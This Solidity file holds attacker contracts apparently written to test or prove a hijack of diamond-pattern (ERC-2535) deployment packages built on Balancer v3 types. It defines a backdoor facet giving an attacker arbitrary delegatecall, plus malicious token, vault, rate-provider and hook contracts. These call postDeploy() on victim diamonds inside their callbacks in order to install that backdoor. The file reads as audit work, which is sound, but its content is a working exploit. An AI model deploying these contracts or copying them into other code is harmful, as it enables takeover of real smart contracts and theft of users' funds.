// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {IDiamond} from "@crane/contracts/interfaces/IDiamond.sol";
import {ERC2535Repo} from "@crane/contracts/introspection/ERC2535/ERC2535Repo.sol";
import {TokenConfig, LiquidityManagement, HookFlags} from "@crane/contracts/interfaces/protocols/dexes/balancer/v3/VaultTypes.sol";
import {IPostDeployAccountHook} from "@crane/contracts/interfaces/IPostDeployAccountHook.sol";

/// Facet the attacker wants planted: arbitrary delegatecall, attacker only.
contract SibBackdoorFacet {
    address public immutable ATTACKER;
    constructor(address a) { ATTACKER = a; }
    function exec(address target, bytes calldata data) external {
        require(msg.sender == ATTACKER, "no");
        (bool ok, bytes memory r) = target.delegatecall(data);
        if (!ok) assembly { revert(add(r, 32), mload(r)) }
    }
}

/// Base for attacker-supplied contracts placed in every deployer-choosable slot.
/// Every callback tries `postDeploy()` on each target diamond (still-mounted hook facet would
/// delegatecall back into `postDeploy(address)` below and cut in the backdoor).
abstract contract SibEvilBase {
    address public immutable BACKDOOR;
    address[] public targets;
    constructor(address backdoor) { BACKDOOR = backdoor; }
    function setTargets(address[] memory t) external { targets = t; }
    function _hijack() internal {
        for (uint256 i; i < targets.length; ++i) {
            // ignore result: inside STATICCALL context this reverts (state change)
            (bool ok,) = targets[i].call{gas: 300000}(abi.encodeWithSignature("postDeploy()"));
            ok;
        }
    }
    /// Runs via delegatecall in the victim diamond's storage context.
    function postDeploy(address) external returns (bool) {
        IDiamond.FacetCut[] memory c = new IDiamond.FacetCut[](1);
        bytes4[] memory s = new bytes4[](1);
        s[0] = SibBackdoorFacet.exec.selector;
        c[0] = IDiamond.FacetCut(BACKDOOR, IDiamond.FacetCutAction.Add, s);
        ERC2535Repo._processFacetCuts(c);
        return true;
    }
}

/// Attacker ERC20 used as a pool token (tta / buffer / unpaired / rate target).
contract SibEvilToken is SibEvilBase {
    mapping(address => uint256) public bal;
    constructor(address b) SibEvilBase(b) {}
    function decimals() external returns (uint8) { _hijack(); return 18; }
    function name() external returns (string memory) { _hijack(); return "EVIL"; }
    function symbol() external returns (string memory) { _hijack(); return "EVIL"; }
    function totalSupply() external returns (uint256) { _hijack(); return 1e30; }
    function balanceOf(address) external returns (uint256) { _hijack(); return 0; }
    function allowance(address, address) external returns (uint256) { _hijack(); return 0; }
    function approve(address, uint256) external returns (bool) { _hijack(); return true; }
    function transfer(address, uint256) external returns (bool) { _hijack(); return true; }
    function transferFrom(address, address, uint256) external returns (bool) { _hijack(); return true; }
}

/// Attacker "SE vault" (its own share token) placed where a pkg expects an IStandardExchange.
contract SibEvilVault is SibEvilToken {
    constructor(address b) SibEvilToken(b) {}
    function previewExchangeIn(address, uint256 a, address) external returns (uint256 amountOut, uint256 amountRefunded) { _hijack(); return (a, 0); }
    function previewExchangeOut(address, address, uint256 a) external returns (uint256) { _hijack(); return a; }
    function getRate() external returns (uint256) { _hijack(); return 1e18; }
}

/// Attacker rate provider.
contract SibEvilRateProvider is SibEvilBase {
    constructor(address b) SibEvilBase(b) {}
    function getRate() external returns (uint256) { _hijack(); return 1e18; }
}

/// Positive control: the already-known ConstProd attacker hooks (h3 NEW-1 / r3) — used only to prove the
/// WindowProbe oracle flags a real hijack.
contract SibEvilHooks is SibEvilBase {
    constructor(address b) SibEvilBase(b) {}
    function onRegister(address, address pool, TokenConfig[] memory, LiquidityManagement calldata)
        external
        returns (bool)
    {
        IPostDeployAccountHook(pool).postDeploy();
        return true;
    }
    function getHookFlags() external pure returns (HookFlags memory f) { return f; }
}
